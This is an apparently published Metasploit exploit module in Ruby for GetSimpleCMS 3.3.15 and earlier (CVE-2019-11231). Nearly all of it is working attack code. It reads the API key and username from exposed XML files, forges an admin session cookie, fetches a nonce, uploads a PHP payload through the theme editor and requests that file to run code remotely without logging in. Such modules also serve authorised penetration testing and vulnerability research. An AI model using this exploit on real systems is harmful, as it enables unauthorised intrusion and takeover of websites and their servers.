# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "GetSimpleCMS Unauthenticated RCE",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in GetSimpleCMS,
        which allows unauthenticated attackers to perform Remote Code Execution.
        An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user,
        however authentication can be bypassed by leaking the cms API key to target the session manager.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;truerand0m&#039; #  Discovery, exploit and Metasploit from Khalifazo,incite_team
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-11231&#039;],
          [&#039;URL&#039;, &#039;https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;GetSimpleCMS 3.3.15 and before&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 28 2019",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the cms&#039;, &#039;/&#039;])
      ])
  end

  def gscms_version
      res = send_request_cgi(
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;/&#039;)
      )
      return unless res && res.code == 200

      generator = res.get_html_document.at(
        &#039;//script[@type = "text/javascript"]/@src&#039;
        )

      fail_with(Failure::NotFound, &#039;Failed to retrieve generator&#039;) unless generator
      vers = generator.value.split(&#039;?v=&#039;).last.gsub(".","")
      return unless vers
      @version = vers
  end

  def get_salt
    uri = normalize_uri(target_uri.path, &#039;data&#039;, &#039;other&#039;, &#039;authorization.xml&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    )
    return unless res && res.code == 200

    fail_with(Failure::NotFound, &#039;Failed to retrieve salt&#039;) if res.get_xml_document.at(&#039;apikey&#039;).nil?
    @salt = res.get_xml_document.at(&#039;apikey&#039;).text
  end

  def get_user
    uri = normalize_uri(target_uri.path, &#039;data&#039;, &#039;users&#039; ,&#039;/&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    )
    return unless res && res.code == 200

    fail_with(Failure::NotFound, &#039;Failed to retrieve username&#039;) if res.get_html_document.at(&#039;[text()*="xml"]&#039;).nil?
    @username = res.get_html_document.at(&#039;[text()*="xml"]&#039;).text.split(&#039;.xml&#039;).first
  end

  def gen_cookie(version,salt,username)
    cookie_name = "getsimple_cookie_#{version}"
    sha_salt_usr = Digest::SHA1.hexdigest("#{username}#{salt}")

    sha_salt_cookie = Digest::SHA1.hexdigest("#{cookie_name}#{salt}")
    @cookie = "GS_ADMIN_USERNAME=#{username};#{sha_salt_cookie}=#{sha_salt_usr}"
  end
  def get_nonce(cookie)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri,&#039;admin&#039;,&#039;theme-edit.php&#039;),
      &#039;cookie&#039; =>  cookie,
      &#039;vars_get&#039; => {
          &#039;t&#039; => &#039;Innovation&#039;,
          &#039;f&#039; => &#039;Default Template&#039;,
          &#039;s&#039; => &#039;Edit&#039;
      }
    })

    fail_with(Failure::NotFound, &#039;Failed to retrieve nonce&#039;) if res.get_html_document.at(&#039;//input[@id = "nonce"]/@value&#039;).nil?
    @nonce = res.get_html_document.at(&#039;//input[@id = "nonce"]/@value&#039;)
  end

  def exploit
    unless check == CheckCode::Vulnerable
        fail_with(Failure::NotVulnerable, &#039;It appears that the target is not vulnerable&#039;)
    end
    version = gscms_version
    salt = get_salt
    username = get_user
    cookie = gen_cookie(version,salt,username)
    nonce = get_nonce(cookie)

    fname = "#{rand_text_alpha(6..16)}.php"
    php   = %Q|<?php #{payload.encoded} ?>|
    upload_file(cookie,nonce,fname,php)
    send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path,&#039;theme&#039;,fname),
    })
  end

  def check
    version = gscms_version
    unless version
        return CheckCode::Safe
    end
    vprint_status "GetSimpleCMS version #{version}"
    unless vulnerable
        return CheckCode::Detected
    end
    CheckCode::Vulnerable
  end

  def vulnerable
    uri = normalize_uri(target_uri.path, &#039;data&#039;, &#039;other&#039;, &#039;authorization.xml&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    )
    return unless res && res.code == 200

    uri = normalize_uri(target_uri.path, &#039;data&#039;, &#039;users&#039;, &#039;/&#039;)
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    )
    return unless res && res.code == 200
    return true
  end

  def upload_file(cookie,nonce,fname,content)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path,&#039;admin&#039;,&#039;theme-edit.php&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;submitsave&#039;    => 2,
        &#039;edited_file&#039; => fname,
        &#039;content&#039; => content,
        &#039;nonce&#039; => nonce
      }
    })
  end
end

